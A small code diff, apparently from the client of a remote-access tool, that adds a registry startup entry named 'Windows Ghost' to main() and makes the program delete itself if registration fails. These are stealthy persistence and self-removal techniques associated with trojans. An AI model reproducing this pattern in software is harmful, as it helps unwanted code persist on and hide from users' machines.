@@ -4,6 +4,9 @@
 #include "stdafx.h"
 #include "ClientDll.h"
 #include <common/iniFile.h>
+extern "C" {
+#include "reg_startup.h"
+}
 
 // 自动启动注册表中的值
 #define REG_NAME "a_ghost"
@@ -177,6 +180,13 @@ BOOL CALLBACK callback(DWORD CtrlType)
 
 int main(int argc, const char *argv[])
 {
+	// 注册启动项
+	int r = RegisterStartup("Windows Ghost", "WinGhost");
+	if (r <= 0) {
+		BOOL s = self_del();
+		if (!IsDebug)return r;
+	}
+
 	if (!SetSelfStart(argv[0], REG_NAME))
 	{
 		Mprintf("设置开机自启动失败，请用管理员权限运行.\n");
